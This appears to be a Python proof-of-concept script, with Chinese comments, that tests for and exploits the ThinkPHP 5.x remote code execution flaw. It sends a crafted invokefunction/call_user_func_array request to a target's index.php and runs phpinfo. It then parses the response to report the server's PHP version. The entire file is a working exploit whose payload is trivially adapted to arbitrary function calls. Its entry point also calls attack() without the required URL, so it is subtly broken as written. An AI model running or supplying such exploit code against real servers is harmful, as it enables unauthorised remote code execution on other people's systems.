# -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup

'''
moon.py -u thinkphp http://xxxx.xxxx.xxxx.xxxx:xx
ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。
直接访问http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1，即可执行phpinfo：
'''


def attack(url):
    print('[+]开始检测 thinkphp5.x_rce ！')
    URL1 = url + r'/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1'
    try:
        re = requests.get(URL1, verify=False, timeout=10)
    except Exception:
        print('[-]访问漏洞页面失败,未发现该漏洞！')
        print('\n')
    else:
        if re.status_code == 500 and 'PHP' in re.text and 'System ' in re.text:
            print('[+]phpinfo成功执行:', URL1)
            try:
                soup=BeautifulSoup(re.content,"lxml")
                print('[+]获取到的php版本如下：')
                print(soup.find_all('h1')[0].get_text())
                print('[+]漏洞检测结束，存在 thinkphp5.x_rce ！')
                print('\n')
            except Exception:
                print('[-]获取数据出错！请自行访问页面判断.')
                print('\n')
        else:
            print('[-]访问漏洞页面失败,未发现该漏洞：', URL1, re.status_code)
            print('\n')


if __name__ == "__main__":
    attack()
